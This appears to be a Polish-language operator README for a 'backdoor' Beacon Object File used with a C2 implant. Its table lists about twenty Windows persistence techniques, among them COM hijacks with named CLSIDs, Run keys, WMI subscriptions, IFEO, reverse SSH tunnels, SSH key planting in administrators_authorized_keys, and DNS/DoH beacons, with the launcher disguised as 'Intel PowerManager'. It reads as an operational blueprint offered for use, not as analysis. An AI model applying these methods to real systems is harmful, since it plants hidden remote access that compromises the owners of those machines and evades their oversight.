# backdoor BOF — recovery operator (apply)

```
backdoor help | list
backdoor apply <id> [a] [b]     # jeden id, jeden Demon
backdoor clean <id>|all         # zdjęcie persist; sshd/WinRM zostają
```

Inbound **10.66.0.0/24**. Nigdy WAN 22/5985. Klucz = plik. Coffee: 1 BOF / PID.

HMAC / signed URL siedzą w `HKCU\Software\Intel\PowerManager\Data` (launcher `%LOCALAPPDATA%\Intel\PowerManager\ipma-reg.ps1`) — nie w `schtasks /tr`.

## Apply

| id | apply | src |
|---|---|---|
| wake | curl file + HKCU Run + ONLOGON | T1053 + T1547.001 |
| ssh | `ssh.exe -R` persist hop `root@10.66.0.1` | T1021.004 |
| sshkey | APPEND user `.ssh` + High: `ProgramData\ssh\administrators_authorized_keys` | T1098.004 |
| knock | SPA HMAC-SHA256 UDP 62201 listen/send, fw wg0 | fwknop-class, nie WoL |
| dns | TXT parse + curl 30m | T1071.004 |
| doh | Cloudflare DoH TXT 30m | T1572 |
| bits | T1197 + SetNotifyCmdLine | T1197 |
| com | HKCU LocalServer32 MsCtfMonitor + CacheTask + ours | COM-Hunter / COM_Hijack_BOF |
| treatas | TreatAs MsCtfMonitor → nasz CLSID | COM-Hunter |
| logon | UserInitMprLogonScript | T1037.001 |
| startup | `Startup\IpmaUpdate.vbs` (silent wscript) | PersistBOF (bez DLL) |
| profile | PowerShell profile | T1546.013 |
| active | Active Setup StubPath | T1547.014 |
| autorun | cmd AutoRun | T1546.001 |
| mshta | signed CDN .hta | T1218.005 |
| winrm | 5985 + firewall wg0 | T1021.006 |
| proxy | PortProxy `127.0.0.1:2200` → `:22` + iphlpsvc PARAMCHANGE | addportproxy-bof, bez netsh |
| wmi | explorer.exe start → wake file | WMIPersistKit |
| time | Time Provider tylko gdy DLL już na dysku | PersistBOF |
| sshd | OpenSSH + fw overlay (LAN SSH zostaje) | T1133 |
| ifeo | SilentProcessExit WerFault | T1546.012 |

## GitHub — wzięte / odrzucone

Wzięte (wzór, nie `.o`):
- [nickvourd/COM-Hunter](https://github.com/nickvourd/COM-Hunter) — LocalServer32, TreatAs, CLSID `{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}`
- [bsdrip/COM_Hijack_BOF](https://github.com/bsdrip/COM_Hijack_BOF) — CacheTask `{0358B920-0AC7-461F-98F4-58E32CD89148}`
- [0xGunrunner/addportproxy-bof](https://github.com/0xGunrunner/addportproxy-bof) — `HKLM\...\PortProxy\v4tov4\tcp` + `iphlpsvc` PARAMCHANGE
- [N4kedTurtle/PersistBOF](https://github.com/N4kedTurtle/PersistBOF) — Startup folder (my: `.cmd`, nie proxy-DLL)
- [0xbngs/WMIPersistKit](https://github.com/0xbngs/WMIPersistKit) — filtr `Win32_Process` / `explorer.exe`
- [rvrsh3ll/BOF_Collection](https://github.com/rvrsh3ll/BOF_Collection) — `KEY_WOW64_64KEY` na HKCU Run

Odrzucone w tym BOF (DLL albo Coffee-COM-wait):
- PersistBOF Print Monitor / Time Provider DLL / Junction / XLL
- nickzer0/PersisTask-BOF ITaskService COM
- trustedsec ghost_task (SYSTEM + SD)
- snovvcrash BackdoorSCManager SDDL

## CLSID

| CLSID | kto |
|---|---|
| `{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}` | MsCtfMonitor (logon task) |
| `{0358B920-0AC7-461F-98F4-58E32CD89148}` | CacheTask (logon) |
| `{8B4E3D9A-6C2F-4A11-9D4E-B7C1A2E3F406}` | nasz LocalServer32 |

## Clean

```
backdoor clean <id>
backdoor clean all
backdoor clean sshkey <needle>
```

Zdejmuje pliki / HKCU Run / schtask / fw / COM / WMI tej metody. `clean all` — wszystkie oprócz `sshkey` (needle). Coffee: 1 BOF / PID.

- **sshd / winrm** — tylko reguła fw overlay. Serwis zostaje (LAN).
- **sshkey** — `clean sshkey <needle>`. Nigdy nie wycina całego `authorized_keys`.
- **wake** — `ipma-reg.ps1` + `HKCU\Software\Intel\PowerManager` + Run/task `MaelBdWake`.
